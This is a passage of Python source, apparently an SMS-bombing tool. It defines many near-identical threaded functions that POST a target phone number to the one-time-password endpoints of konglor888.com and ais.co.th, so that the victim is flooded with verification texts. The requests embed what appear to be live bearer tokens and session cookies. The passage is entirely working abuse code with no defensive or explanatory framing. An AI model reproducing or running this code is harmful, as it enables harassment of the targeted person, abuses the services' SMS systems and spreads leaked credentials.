    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(ris)
        threading.Thread(target=i).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def j():
            rjs=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rjs)
        threading.Thread(target=j).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def k():
            rks=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rks)
        threading.Thread(target=k).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def l():
            rls=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rls)
        threading.Thread(target=l).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def m():
            rms=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rms)
        threading.Thread(target=m).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def n():
            rns=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rns)
        threading.Thread(target=n).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def o():
            ros=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(ros)
        threading.Thread(target=o).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def p():
            rps=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rps)
        threading.Thread(target=p).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def q():
            rqs=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rqs)
        threading.Thread(target=q).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def r():
            rrs=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rrs)
        threading.Thread(target=r).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def s():
            rss=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
